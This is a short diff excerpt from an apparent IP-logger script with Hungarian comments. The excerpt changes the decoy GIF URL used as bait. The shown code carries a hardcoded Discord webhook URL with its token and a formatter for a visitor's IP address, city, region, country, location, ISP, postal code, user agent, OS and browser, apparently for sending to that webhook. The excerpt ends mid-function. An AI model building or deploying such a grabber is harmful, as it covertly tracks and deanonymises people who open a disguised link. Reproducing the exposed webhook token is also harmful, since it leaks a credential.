@@ -6,7 +6,7 @@ import httpagentparser
 # --- KONFIGURÁCIÓ ---
 webhook = 'https://discord.com/api/webhooks/1490358856919023848/KIf9rO2Q7XbwDKLjiCmEu3tSF83txYJzvJNHu5B8qkzVhqzth0kwNDOkLghZqNdvhhcz'
 # Ez a GIF fog megjelenni a Discordon, és ide dobja a böngészőt is
-target_gif = 'https://media.tenor.com/x8v1oNUOmCIAAAAd/rickroll-roll.gif' 
+target_gif = 'https://tenor.com/view/no-gif-23548728' 
 
 def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
     return {
